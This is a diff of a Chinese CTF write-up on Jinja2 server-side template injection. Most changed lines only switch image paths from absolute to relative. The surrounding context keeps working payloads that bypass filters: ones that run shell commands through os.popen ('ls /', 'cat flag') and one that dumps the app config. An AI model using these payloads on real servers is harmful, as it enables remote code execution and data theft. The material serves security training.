@@ -1,18 +1,18 @@
 ## Level 1 - 无 WAF (No WAF)
 
 首先，编写 Python 脚本来查找可以用于 RCE（远程代码执行）的 Python 内建类及其索引：
-![no waf 1](/hello_ctf/images/ssti1.png)
-![no waf 2](/hello_ctf/images/ssti2.png)
+![no waf 1](./images/ssti1.png)
+![no waf 2](./images/ssti2.png)
 找到可利用的类的索引后，使用该索引进行注入以执行命令：
-![no waf 3](/hello_ctf/images/ssti3.png)
+![no waf 3](./images/ssti3.png)
 
 -----
 
 ## Level 2 - 过滤 `{{` (['{{']])
 
 如果目标过滤了 `{{`，但允许 `{% %}` 模板语句块，可以使用 `{% print ... %}` 或其他语句块来执行代码。
-![['\{\{'] 1](/hello_ctf/images/ssti4.png)
-![['\{\{'] 2](/hello_ctf/images/ssti5.png)
+![['\{\{'] 1](./images/ssti4.png)
+![['\{\{'] 2](./images/ssti5.png)
 
 -----
 
@@ -67,7 +67,7 @@
 {% endif %}
 {% endfor %}
 ```
-![[‘[‘, ‘]’] 2](/hello_ctf/images/ssti6.png)
+![[‘[‘, ‘]’] 2](./images/ssti6.png)
 
 -----
 
@@ -81,7 +81,7 @@
 **利用 `request` 对象 Payload:**
 
 首先，使用脚本或手动探测找到可用的函数及其索引（例如找到 `eval`）。
-![[‘\‘’, ‘“‘] 1](/hello_ctf/images/ssti7.png)
+![[‘\‘’, ‘“‘] 1](./images/ssti7.png)
 
 然后构造注入 Payload，将需要的字符串通过 `request` 对象传入：
 
@@ -95,7 +95,7 @@
 arg1=eval
 arg2=__import__("os").popen("ls /").read()
 ```
-![[‘\‘’, ‘“‘] 2](/hello_ctf/images/ssti8.png)
+![[‘\‘’, ‘“‘] 2](./images/ssti8.png)
 
 -----
 
@@ -140,8 +140,8 @@ arg2=__import__("os").popen("ls /").read()
     ```
 
     *`x` 需要是模板上下文中一个可利用的对象实例。*
-	![['_'] 1](/hello_ctf/images/ssti9.png)
-	![['_'] 2](/hello_ctf/images/ssti10.png)
+	![['_'] 1](./images/ssti9.png)
+	![['_'] 2](./images/ssti10.png)
 
 -----
 
@@ -171,7 +171,7 @@ arg2=__import__("os").popen("ls /").read()
 {% endfor %}
 ```
 
-![['.'] 1](/hello_ctf/images/ssti11.png)
+![['.'] 1](./images/ssti11.png)
 
 -----
 
@@ -184,7 +184,7 @@ arg2=__import__("os").popen("ls /").read()
 ```
 
 *将关键字拆分并用 `+` 连接，使得过滤器无法匹配完整的关键字字符串。
-![过滤关键字 1](/hello_ctf/images/ssti12.png)
+![过滤关键字 1](./images/ssti12.png)
 
 -----
 
@@ -230,7 +230,7 @@ arg2=__import__("os").popen("ls /").read()
     {# 使用构造的数字作为索引 #}
     {{ ().__class__.__base__.__subclasses__()[erwuba].__init__.__globals__['os'].popen('cat flag').read() }}
     ```
-![0-9 1](/hello_ctf/images/ssti13.png)
+![0-9 1](./images/ssti13.png)
 
 -----
 
@@ -249,7 +249,7 @@ arg2=__import__("os").popen("ls /").read()
     ```jinja
     {{ get_flashed_messages.__globals__['current_app'].config }}
     ```
-![set config = None 1](/hello_ctf/images/ssti14.png)
+![set config = None 1](./images/ssti14.png)
 
 -----
 
